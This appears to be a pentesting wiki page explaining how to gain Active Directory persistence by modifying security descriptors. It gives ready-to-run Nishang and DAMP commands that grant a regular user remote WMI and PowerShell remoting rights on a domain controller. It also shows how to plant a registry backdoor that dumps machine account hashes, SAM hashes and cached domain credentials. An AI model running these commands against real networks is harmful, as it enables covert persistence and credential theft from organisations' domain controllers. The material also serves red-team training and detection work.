# Security Descriptors

## Security Descriptors

Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL:: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

The **security descriptors **are used to **store **the **permissions **an **object **has **over **an **object**. If you can just **make **a **little change **in the **security descriptor **of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.

Then, this persistence technique is based on the hability to win every privilege needed against certain objects, to be able to perform a task that usually requires admin privileges but without the need of being admin.

You can give a user access to **execute remotely WMI **[**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):

```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```

Give access to** winrm PS console to a user **[**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**

```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```

Access the **registry **and **dump hashes** creating a **Reg backdoor using **[**DAMP**](https://github.com/HarmJ0y/DAMP)**, **so you can at any moment retrieve the **hash of the computer**, the **SAM **and any **cached AD** credential in the computer. So, it's very useful to give this permission to a **regular user against a Domain Controller computer**:

```bash
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
